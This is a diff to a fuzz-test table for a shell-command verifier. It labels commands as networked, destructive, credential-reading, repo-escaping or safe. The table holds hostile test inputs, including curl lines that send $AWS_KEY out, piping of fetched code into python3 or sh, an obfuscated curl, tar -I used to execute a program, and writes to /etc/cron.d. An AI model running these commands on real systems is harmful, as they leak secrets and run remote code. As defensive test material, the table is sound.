@@ -62,17 +62,21 @@ F-R30	verify-repo-escape	strict	cp fz-notes.txt -t/etc/cron.d
 F-R31	verify-repo-escape	strict	sort -o/etc/fz-attached-ranking fz-notes.txt
 F-R32	verify-repo-escape	strict	grep -f/etc/passwd fz-notes.txt
 F-R33	verify-repo-escape	strict	gcc -I/usr/include -c fz-notes.txt
-F-X01	verify-networked	xfail	wget --remote-name http://127.0.0.1:9/f
-F-X02	verify-networked	xfail	curl -K /tmp/verify-fuzz-curlcfg http://127.0.0.1:9/
-F-X03	verify-networked	xfail	wget -i /tmp/verify-fuzz-wgeturls http://127.0.0.1:9/f
-F-X04	verify-destructive	xfail	git --exec-path=/tmp/verify-fuzz-gitexec status
-F-X05	verify-networked	xfail	git archive --remote=ssh://127.0.0.1:9/x HEAD
-F-X06	verify-networked	xfail	busybox wget http://127.0.0.1:9/f
-F-X07	verify-networked	xfail	pip3 download http://127.0.0.1:9/evil.tgz
-F-X08	verify-networked	xfail	telnet 127.0.0.1 9
-F-X09	verify-credential-read	xfail	curl http://127.0.0.1:9/$AWS_KEY
-F-X10	verify-credential-read	xfail	curl -s -H "X: $AWS_KEY" http://127.0.0.1:9/
-F-X11	verify-networked	xfail	curl telnet://127.0.0.1:9/
+F-R34	verify-destructive	strict	tar -Itouch-fz -cf /tmp/verify-fuzz-attached.tar fz-notes.txt
+F-R35	verify-destructive	strict	tar -cIf touch-fz /tmp/verify-fuzz-cluster.tar fz-notes.txt
+F-R36	verify-networked	strict	wget -i/tmp/verify-fuzz-wgeturls http://127.0.0.1:9/f
+F-R37	verify-networked	strict	wget -qi /tmp/verify-fuzz-wgeturls http://127.0.0.1:9/f
+F-X01	verify-networked	strict	wget --remote-name http://127.0.0.1:9/f
+F-X02	verify-networked	strict	curl -K /tmp/verify-fuzz-curlcfg http://127.0.0.1:9/
+F-X03	verify-networked	strict	wget -i /tmp/verify-fuzz-wgeturls http://127.0.0.1:9/f
+F-X04	verify-destructive	strict	git --exec-path=/tmp/verify-fuzz-gitexec status
+F-X05	verify-networked	strict	git archive --remote=ssh://127.0.0.1:9/x HEAD
+F-X06	verify-networked	strict	busybox wget http://127.0.0.1:9/f
+F-X07	verify-networked	strict	pip3 download http://127.0.0.1:9/evil.tgz
+F-X08	verify-networked	strict	telnet 127.0.0.1 9
+F-X09	verify-credential-read	strict	curl http://127.0.0.1:9/$AWS_KEY
+F-X10	verify-credential-read	strict	curl -s -H "X: $AWS_KEY" http://127.0.0.1:9/
+F-X11	verify-networked	strict	curl telnet://127.0.0.1:9/
 F-X12	verify-networked	xfail	python3 -c 'import socket'
 F-X13	verify-networked	xfail	curl http://127.0.0.1:9/f | python3
 F-X14	verify-networked	xfail	X=POST curl -X $X http://127.0.0.1:9/
@@ -80,7 +84,7 @@ F-X15	verify-destructive	xfail	. /tmp/verify-fuzz-src
 F-X16	verify-networked	xfail	$'\x63url' http://127.0.0.1:9/f | sh
 F-X17	verify-destructive	xfail	NODE_PATH=/tmp/verify-fuzz-nm node -e 1
 F-X18	verify-networked	xfail	/tmp/verify-fuzz-fetched
-F-X19	verify-destructive	xfail	tar -I touch-fz -cf /tmp/verify-fuzz.tar fz-notes.txt
+F-X19	verify-destructive	strict	tar -I touch-fz -cf /tmp/verify-fuzz.tar fz-notes.txt
 F-P01	PASS	strict	printf ok
 F-P02	PASS	strict	printf ok | grep ok
 F-P03	PASS	strict	FOO=1 printf ok
@@ -98,3 +102,15 @@ F-P14	PASS	strict	PORT=9 curl http://127.0.0.1:$PORT/fixture
 F-P15	PASS	strict	printf ok -C./fz-sub
 F-P16	PASS	strict	printf ok --prefix=fz-src/x
 F-P17	PASS	strict	printf ok -DFOO=fz-src/x
+F-P18	PASS	strict	wget --version
+F-P19	PASS	strict	curl -k http://127.0.0.1:9/fixture
+F-P20	PASS	strict	git archive --list
+F-P21	PASS	strict	pip3 --version
+F-P22	PASS	strict	printf telnet-ok
+F-P23	PASS	strict	curl -sS http://127.0.0.1:9/fixture
+F-P24	PASS	strict	printf busybox
+F-P25	PASS	strict	curl http://127.0.0.1:9/$BRANCH/fixture
+F-P26	PASS	strict	git --exec-path
+F-P27	PASS	strict	tar -czf /tmp/verify-fuzz-ok.tar fz-notes.txt
+F-P28	PASS	strict	tar -cf /tmp/verify-fuzz-plain.tar fz-notes.txt
+F-P29	PASS	strict	wget -q --version
